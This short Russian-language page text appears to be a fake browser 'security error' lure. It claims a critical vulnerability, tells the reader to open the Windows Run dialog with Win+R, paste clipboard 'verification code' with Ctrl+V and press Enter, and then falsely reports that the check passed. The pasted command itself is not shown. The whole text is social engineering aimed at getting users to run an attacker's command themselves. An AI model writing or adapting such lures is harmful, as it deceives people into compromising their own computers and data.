Ошибка системы безопасности

Ваш браузер обнаружил критическую уязвимость. Для восстановления работы необходимо пройти проверку.

Нажмите Win + R (или Win + X → I для терминала), чтобы открыть окно "Выполнить".

Скопируйте следующий код и нажмите Enter для завершения проверки:

  • 1. Нажмите Ctrl + V (вставьте код)
  • 2. Нажмите Enter

Подождите 10 секунд. Не выключайте компьютер.

Проверка пройдена! Ожидайте восстановления системы...
